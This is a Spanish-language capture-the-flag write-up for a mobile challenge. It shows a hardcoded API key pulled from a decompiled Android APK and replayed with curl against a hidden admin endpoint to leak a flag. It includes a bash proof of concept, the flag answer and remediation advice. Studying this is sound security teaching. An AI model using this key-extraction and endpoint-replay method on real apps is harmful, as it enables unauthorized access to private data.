# 📱 Whispers in the Wire

> Broken Access Control: endpoint admin oculto + API key hardcodeada en el APK

| Categoría | Dificultad | Puntos | Autor |
|---|---|---|---|
| Mobile | 🟢 Easy | 310 | diriartev |

**Flag:** `flag{62c8f2fa896e9b24}`

---

## Resumen (TL;DR)

**WhisperChat** es una app de mensajería. El APK decompilado revela una interfaz **Retrofit** que declara todas las rutas del backend, incluida una oculta: `GET /api/admin/messages`.

La app oculta la función de admin con un flag del lado del cliente (`Session.isAdmin()`, que solo controla la visibilidad de un botón), pero el servidor autoriza **únicamente** con una API key compartida que está incrustada en el código. Cualquiera que lea el APK obtiene la key y puede llamar directamente al endpoint "solo admin". El feed admin filtra un hilo privado de ops con el código de recuperación del vault → la flag.

**Causa raíz:** autorización del lado del cliente. Ocultar un botón ≠ proteger una ruta (**OWASP A01: Broken Access Control**).

| | |
|---|---|
| **Instancia** | `7d3c824cf653c6e9.chal.ctf.ae` |

## Paso 0 — Material entregado

Se descomprime el adjunto (password `infected`):

```text
$ find . -type f | sort
./WhisperChat/AndroidManifest.xml
./WhisperChat/res/values/strings.xml
./WhisperChat/sources/com/whisperchat/app/data/ApiClient.java
./WhisperChat/sources/com/whisperchat/app/data/WhisperApi.java
./WhisperChat/sources/com/whisperchat/app/model/Message.java
./WhisperChat/sources/com/whisperchat/app/model/MessageList.java
./WhisperChat/sources/com/whisperchat/app/model/Session.java
./WhisperChat/sources/com/whisperchat/app/ui/SettingsActivity.java
./whisper_client.py
```

> En retos mobile, **el APK decompilado ES el mapa**. No te quedes solo con el cliente de ejemplo: lee las fuentes Java.

## Paso 1 — Leer el cliente Python

`whisper_client.py` muestra lo básico de la API:

```python
API_BASE = "https://api.whisperchat.internal"
API_KEY  = "fluidctf-api-2026-whispers"
HEADERS = {
    "X-API-Key": API_KEY,
    "Content-Type": "application/json",
    "User-Agent": "WhisperChat/1.4.2 (Android 14; SDK 34)",
}
# GET  /api/messages -> listar mensajes
# POST /api/messages -> enviar mensaje
```

Nada sensible todavía: solo el endpoint público y la API key.

## Paso 2 — Leer la interfaz de la API (aquí está el oro)

`WhisperApi.java` es la interfaz Retrofit con **todas** las rutas del backend, incluida una que el cliente Python no usa:

```java
public interface WhisperApi {
    @GET("api/messages")
    Call<MessageList> getMessages(@Query("recipient") String recipient);

    @POST("api/messages")
    Call<Message> sendMessage(@Body Message message);

    /* Admin console feed: every channel, including private staff threads.
     * Reached from SettingsActivity only when the account is staff, but the
     * call carries the same shared API key as everything else. */
    @GET("api/admin/messages")
    Call<MessageList> getAdminMessages();
}
```

Ruta oculta encontrada: `GET /api/admin/messages`. El propio comentario avisa que usa la misma API key compartida.

## Paso 3 — Confirmar que la "protección" es falsa

```java
// SettingsActivity.java
// Staff-only console entry. Hidden for normal accounts, but the backend never
// checks anything beyond the shared API key, so the route it opens is reachable
// by anyone replaying that key.
adminEntry.setVisibility(Session.current().isAdmin() ? View.VISIBLE : View.GONE);
```

```java
// Session.java
/* Client-side session state. The isAdmin() flag only toggles UI; the server
 * does not consult it, which is the whole problem. */
public boolean isAdmin() { return this.admin; }  // admin = false por defecto
```

Y `ApiClient.java` muestra un interceptor OkHttp que adjunta **la misma key** a todas las peticiones:

```java
private static final String API_KEY = "fluidctf-api-2026-whispers";
// ...
.header("X-API-Key", API_KEY)
```

**Conclusión:** `isAdmin()` solo oculta un botón. El servidor autoriza solo por la API key compartida, que tiene cualquiera que lea el APK.

## Paso 4 — Explotación

```bash
H="7d3c824cf653c6e9.chal.ctf.ae"
K="fluidctf-api-2026-whispers"
UA="WhisperChat/1.4.2 (Android 14; SDK 34)"

# Endpoint público (referencia)
curl -s -H "X-API-Key: $K" -H "User-Agent: $UA" "https://$H/api/messages"

# Endpoint admin oculto
curl -s -H "X-API-Key: $K" -H "User-Agent: $UA" "https://$H/api/admin/messages"
```

El endpoint público devuelve 4 mensajes. El admin devuelve **5**, uno extra marcado `"private": true`:

```json
{
  "count": 5,
  "messages": [
    {
      "body": "Vault recovery code for Q2: flag{62c8f2fa896e9b24}",
      "id": "b9a8b8f5-c795-4604-8c01-cf107d88f8a5",
      "private": true,
      "recipient": "ops",
      "sender": "admin",
      "timestamp": "2026-04-09T18:42:00Z"
    }
  ]
}
```

🚩 **FLAG:** `flag{62c8f2fa896e9b24}`

## PoC completo

```bash
#!/usr/bin/env bash
# Whispers in the Wire — BAC PoC — autor: diriartev
H="7d3c824cf653c6e9.chal.ctf.ae"
K="fluidctf-api-2026-whispers"   # API key extraída del APK decompilado
UA="WhisperChat/1.4.2 (Android 14; SDK 34)"

curl -s -H "X-API-Key: $K" -H "User-Agent: $UA" \
  "https://$H/api/admin/messages" | python3 -m json.tool
# -> body: "Vault recovery code for Q2: flag{62c8f2fa896e9b24}"
```

## Remediación

- **Autorizar en el servidor, no en el cliente.** Cada endpoint privilegiado (`/api/admin/*`) debe verificar identidad y rol en el backend.
- **No usar una API key compartida como credencial.** Usar tokens por usuario (OAuth/JWT con scopes/roles) validados server-side.
- **No incrustar secretos en el APK.** Todo lo que va en el cliente es público.
- Segregar los datos privados por autorización real, no por "endpoint que la UI no muestra".

## Conclusión

Control de acceso del lado del cliente = **ningún control**. Cuando una app oculta una función según un flag local, pregúntate si el servidor revalida esa autorización. Si el endpoint existe en el código (interfaces Retrofit, rutas comentadas, constantes de URL), pruébalo directo con `curl`. El APK decompilado suele contener el contrato completo de la API y los secretos que abren esas puertas.
